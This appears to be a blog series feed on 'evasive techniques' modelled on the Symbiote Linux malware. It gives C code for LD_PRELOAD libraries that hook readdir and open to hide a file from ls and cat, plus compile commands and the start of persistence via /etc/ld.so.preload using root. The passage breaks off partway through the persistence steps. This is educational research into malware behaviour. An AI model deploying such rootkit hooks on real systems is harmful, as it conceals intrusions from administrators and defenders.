&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;errno.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;dirent.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define MALICIOUS_FILE &amp;#34;syl.lys&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#a6e22e">int&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>original_open)(&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">int&lt;/span> flags, ...) &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>original_readdir)(DIR &lt;span style="color:#f92672">*&lt;/span>dirp) &lt;span style="color:#f92672">=&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">open&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>filename, &lt;span style="color:#66d9ef">int&lt;/span> flags, ...)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (strcmp(filename, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> ENOENT;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_open &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;open&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> original_open(filename, flags);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">readdir&lt;/span>(DIR &lt;span style="color:#f92672">*&lt;/span>dirp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>ret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> original_readdir &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;readdir&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>((ret &lt;span style="color:#f92672">=&lt;/span> original_readdir(dirp))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(strstr(ret&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name, MALICIOUS_FILE) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> ret;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s test it out, supposedly we shouldn&amp;rsquo;t get entries from &lt;code>ls&lt;/code> and &lt;code>cat&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ touch syl.lys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>intercept_open.c malicious.c malicious.so syl.lys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ export LD_PRELOAD&lt;span style="color:#f92672">=&lt;/span>./malicious.so
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>intercept_open.c malicious.c malicious.so README.md
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat syl.lys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cat: syl.lys: No such file or directory
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="end" >End
&lt;span>
&lt;a href="#end">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>With that I am concluding this post, again if you reached here thank you so much it means a lot! In the next part I will get deeper and make our malicious file to be running and beaconing a malicious C2 server, we will look through some C2 communication examples using the DNS protocol so that we can remain under the radar(or the firewall ^^).&lt;/p>
&lt;p>&lt;a href="https://github.com/syrull/evasive_techniques/tree/main/Part_2_open">Full Source Code&lt;/a>&lt;/p>
&lt;h1 id="resources" >Resources
&lt;span>
&lt;a href="#resources">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>This post wouldn&amp;rsquo;t be possible without:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://linux.die.net/man/2/openat">https://linux.die.net/man/2/openat&lt;/a>&lt;/li>
&lt;li>And some kind StackOverflow users!&lt;/li>
&lt;/ul></description></item><item><title>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)</title><link>https://sy1.sh/posts/dynamic-linker-hijacking-experiments/</link><pubDate>Sun, 02 Oct 2022 21:45:03 +0300</pubDate><guid>https://sy1.sh/posts/dynamic-linker-hijacking-experiments/</guid><description>&lt;h2 id="series" >Series
&lt;span>
&lt;a href="#series">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;ol>
&lt;li>(this one)&lt;/li>
&lt;li>&lt;a href="https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/">Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://sy1.sh/posts/dns-c2-communcation/">Using DNS as C2 Communication - Evasive Techniques (Part 3)&lt;/a>&lt;/li>
&lt;/ol>
&lt;h1 id="overview" >Overview
&lt;span>
&lt;a href="#overview">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>Recently I heard about a new malware called &lt;a href="https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat">Symbiote&lt;/a>, which the researches are calling the &amp;ldquo;Nearly-Impossible-to-Detect Linux Threat&amp;rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I&amp;rsquo;ve started to research it.&lt;/p>
&lt;p>I highly advise you to read through these articles first before we begin with the actual post:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://attack.mitre.org/techniques/T1574/006/">Hijack Execution Flow: Dynamic Linker Hijacking&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.baeldung.com/linux/ld_preload-trick-what-is">What Is the LD_PRELOAD?&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">What is a Shared Library?&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="implementation" >Implementation
&lt;span>
&lt;a href="#implementation">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;p>I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I&amp;rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.&lt;/p>
&lt;p>What do we need first and how to hide a file from lets say a command like &lt;code>ls&lt;/code>? With a little bit of investigating of how the &lt;code>ls&lt;/code> works internally through the &lt;a href="https://github.com/coreutils/coreutils/blob/master/src/ls.c">source code&lt;/a> and the &lt;a href="https://man7.org/linux/man-pages/man1/ls.1.html">linux manual page&lt;/a>
We can see that internally we have a function that is called &lt;code>print_dir&lt;/code>. I&amp;rsquo;ve truncated the comments of the original source code.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print_dir (&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#f92672">*&lt;/span>name, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#f92672">*&lt;/span>realname, &lt;span style="color:#66d9ef">bool&lt;/span> command_line_arg)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we continue further down the function we can see the loop that actually iterates over the files&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> (true)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> errno &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> next &lt;span style="color:#f92672">=&lt;/span> readdir (dirp); &lt;span style="color:#75715e">// Here we can see that the loop iterates over readdir as long
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// as the pointer that readdir returns isn&amp;#39;t null and the errno != 0
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (next)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> file_ignored (next&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name)) &lt;span style="color:#75715e">// we can see here that it the filename is
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// taken from the next variable, lets look through the source code of `readdir`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ...
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s confirm that by invoking &lt;code>nm&lt;/code> this will show us the dynamic symbols that are being loaded from shared libs.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ nm -D /usr/bin/ls | grep &lt;span style="color:#e6db74">&amp;#34;readdir&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> U readdir@GLIBC_2.2.5
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now I concluded that I need to search into the source code of &lt;code>readdir&lt;/code> which is located &lt;a href="https://github.com/torvalds/linux/blob/master/fs/readdir.c">here&lt;/a> and the &lt;a href="https://man7.org/linux/man-pages/man3/readdir.3.html">linux manual page&lt;/a>. The description more or less describes exactly what we concluded from the source code of &lt;code>ls.c&lt;/code>. Lets see where we set that &lt;code>d_name&lt;/code> variable.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;dirent.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">readdir&lt;/span>(DIR &lt;span style="color:#f92672">*&lt;/span>dirp); &lt;span style="color:#75715e">// Signature of the readdir
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ino_t d_ino; &lt;span style="color:#75715e">/* Inode number */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> off_t d_off; &lt;span style="color:#75715e">/* Not an offset; see below */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">short&lt;/span> d_reclen; &lt;span style="color:#75715e">/* Length of this record */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> d_type; &lt;span style="color:#75715e">/* Type of file; not supported
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> by all filesystem types */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> d_name[&lt;span style="color:#ae81ff">256&lt;/span>]; &lt;span style="color:#75715e">/* Null-terminated filename */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the &lt;code>dirent&lt;/code> structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that &lt;code>d_name&lt;/code> will exists since this field must be implemented on all POSIX systems.&lt;/p>
&lt;/blockquote>
&lt;p>Alright, let&amp;rsquo;s start implementing our own function &lt;code>readdir&lt;/code> that we will wrap the original one with.&lt;/p>
&lt;p>&lt;a href="https://github.com/syrull/evasive_techniques/blob/main/Part_1_readdir/intercept_readdir.c">intercept_readdir.c&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define _GNU_SOURCE
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;dirent.h&amp;gt; // Including the Directory Entry structure&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">// The dynamic linking header file so we can use the dlsym
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// which will give us the address for the readdir symbol
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;dlfcn.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt; // So we can use the strstr&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#a6e22e">readdir&lt;/span>(DIR &lt;span style="color:#f92672">*&lt;/span>dirp) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(handle)(DIR &lt;span style="color:#f92672">*&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// https://man7.org/linux/man-pages/man3/dlsym.3.html
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Search for RTLD_NEXT, basically it allow us to wrap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// the original function
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> handle &lt;span style="color:#f92672">=&lt;/span> dlsym(RTLD_NEXT, &lt;span style="color:#e6db74">&amp;#34;readdir&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> dirent &lt;span style="color:#f92672">*&lt;/span>dp;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Iterating over the return values of our original `readdir`
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">while&lt;/span>((dp &lt;span style="color:#f92672">=&lt;/span> handle(dirp))) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-&amp;gt;d_name`)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// break the loop and go to the next entry, essentially skipping our file.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(strstr(dp&lt;span style="color:#f92672">-&amp;gt;&lt;/span>d_name, &lt;span style="color:#e6db74">&amp;#34;syl.lys&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> dp;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This is what our final version of wrapper for &lt;code>readdir&lt;/code> would look like. Now let&amp;rsquo;s try to compile it.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flags:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://stackoverflow.com/questions/5311515/gcc-fpic-option">fPIC&lt;/a>&lt;/li>
&lt;li>&lt;code>-shared&lt;/code> creates a shared object&lt;/li>
&lt;li>&lt;a href="https://stackoverflow.com/questions/8836707/explanation-of-d-gnu-source-why-to-use-it-and-when">-D_GNU_SOURCE flag / _GNU_SOURCE&lt;/a> - TLDR: We need it for &lt;code>RTLD_NEXT&lt;/code>&lt;/li>
&lt;li>&lt;a href="https://ubuntuforums.org/archive/index.php/t-1054717.html">-ldl&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>Now that we have shared object (*.so) file lets see how to use it in action.&lt;/p>
&lt;h1 id="how-to-overwrite-the-exported-symbols-ld_preload" >How to overwrite the exported symbols? &lt;code>LD_PRELOAD&lt;/code>
&lt;span>
&lt;a href="#how-to-overwrite-the-exported-symbols-ld_preload">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h1>&lt;ul>
&lt;li>&lt;a href="https://man7.org/linux/man-pages/man8/ld.so.8.html">What is LD_PRELOAD?&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>I advise you to read that first to get a better understanding of how it works.&lt;/p>
&lt;p>The next thing that we are going to do is to test our shared library and see if it works. Lets run &lt;code>ls&lt;/code> with our &lt;code>libhidemyfile.so&lt;/code> loaded before anything else.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libhidemyfile.so syl.lys
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ LD_PRELOAD&lt;span style="color:#f92672">=&lt;/span>./libhidemyfile.so ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libhidemyfile.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As you can see we successfully implement a shared library that hides our file from &lt;code>ls&lt;/code>, and not only that command, every command that uses &lt;code>readdir&lt;/code> won&amp;rsquo;t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing &lt;code>LD_PRELOAD&lt;/code> in front of every command.&lt;/p>
&lt;h2 id="etcldsopreload" >/etc/ld.so.preload
&lt;span>
&lt;a href="#etcldsopreload">
&lt;svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg">&lt;path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/>&lt;/svg>
&lt;/a>
&lt;/span>
&lt;/h2>&lt;p>If you read carefully the man pages for &lt;code>LD_PRELOAD&lt;/code> you should know that you won&amp;rsquo;t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.&lt;/p>
&lt;p>Instead we are going to use the &lt;code>/etc/ld.so.preload&lt;/code> which does not suffer from these restrictions. This suffers from requiring root privileges but c&amp;rsquo;mon.. if you are here you will get those!&lt;/p>
&lt;p>We first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then we just need to place our library dir in &lt;code>ld.so.preload&lt;/code> file.&lt;/p>
